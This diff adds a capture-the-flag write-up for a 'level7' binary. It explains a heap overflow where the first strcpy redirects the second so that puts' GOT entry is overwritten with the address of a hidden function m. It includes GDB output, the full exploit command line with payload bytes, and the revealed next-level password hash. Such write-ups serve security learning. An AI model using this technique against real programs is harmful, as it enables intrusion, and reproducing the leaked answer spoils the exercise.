@@ -1,0 +1,32 @@
+level7 takes two arguments (segfaults if there are less).
+
+There is a variable c that seems to be global. The main function first calls malloc twice
+on two different addresses. It then uses [strcpy] to copy argv[1] in the first, argv[2] in the second.
+The it uses fopen to open the .pass file of the next level. It stores its contents inside
+c. Then [puts] is called, printing "~~", whatever that means.
+There is also an [m] function that is never called. The [m] function prints the content of 
+c, then the current time.
+
+After much reflection, we figure we have to use the first call to [strcpy] to overwrite the destination of the
+second string, so that the second call to [strcpy] overwrites the address of [puts] with the address of [m].
+
+First we need the address of [m]. 
+
+(gdb) >info functions
+[...]
+0x080484f4 m
+
+Okay. Next the address of puts in the GOT.
+
+(gdb) >info function puts
+0x08048400 puts
+(gdb) >x/i 0x08048400
+0x08048400<puts>:	 jmp *0x08049928
+
+Good. Now, finally need to know by how many characters we need to overflow [strcpy].
+After many unnecessary tries, I find 20.
+
+Now let's try!
+
+>./level7 $(python -c "print 'X'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - [current time blabla]
